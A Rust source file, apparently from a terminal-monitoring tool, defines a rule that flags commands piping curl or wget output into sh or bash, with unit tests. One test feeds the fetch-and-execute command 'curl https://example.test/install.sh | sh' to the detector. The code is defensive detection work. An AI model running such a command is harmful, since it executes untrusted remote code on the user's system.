use snarkterm_core::TerminalEvent;

#[derive(Debug, Clone)]
pub struct RuleMatch {
    pub rule_id: &'static str,
    pub severity: RuleSeverity,
    pub message: String,
}

#[derive(Debug, Clone, Copy)]
pub enum RuleSeverity {
    Info,
    Warning,
    Danger,
}

#[derive(Debug, Default)]
pub struct SessionContext {
    pub sudo_count: u64,
    pub failed_repeats: u64,
}

pub trait Rule {
    fn id(&self) -> &'static str;
    fn evaluate(&self, event: &TerminalEvent, session: &SessionContext) -> Vec<RuleMatch>;
}

pub struct CurlPipeShellRule;

impl Rule for CurlPipeShellRule {
    fn id(&self) -> &'static str {
        "curl-pipe-shell"
    }

    fn evaluate(&self, event: &TerminalEvent, _session: &SessionContext) -> Vec<RuleMatch> {
        let command = match event {
            TerminalEvent::CommandStarted(info) => &info.command,
            _ => return Vec::new(),
        };

        if (command.contains("curl") || command.contains("wget")) && (command.contains("| sh") || command.contains("| bash")) {
            return vec![RuleMatch {
                rule_id: self.id(),
                severity: RuleSeverity::Danger,
                message: "Downloading a stranger's shell script and giving it the keys. Classic trust fall, minus the trust.".to_string(),
            }];
        }

        Vec::new()
    }
}

#[cfg(test)]
mod tests {
    use super::{CurlPipeShellRule, Rule, RuleSeverity, SessionContext};
    use chrono::Utc;
    use snarkterm_core::{CommandInfo, TerminalEvent};
    use uuid::Uuid;

    fn command_event(command: &str) -> TerminalEvent {
        TerminalEvent::CommandStarted(CommandInfo {
            id: Uuid::new_v4(),
            session_id: Uuid::new_v4(),
            command: command.to_string(),
            cwd: Some("/tmp".to_string()),
            started_at: Utc::now(),
        })
    }

    #[test]
    fn detects_curl_pipe_shell() {
        let rule = CurlPipeShellRule;
        let matches = rule.evaluate(&command_event("curl https://example.test/install.sh | sh"), &SessionContext::default());

        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].rule_id, "curl-pipe-shell");
        assert!(matches[0].message.contains("stranger"));
        assert!(matches!(matches[0].severity, RuleSeverity::Danger));
    }

    #[test]
    fn ignores_plain_curl() {
        let rule = CurlPipeShellRule;
        let matches = rule.evaluate(&command_event("curl https://example.test"), &SessionContext::default());

        assert!(matches.is_empty());
    }
}
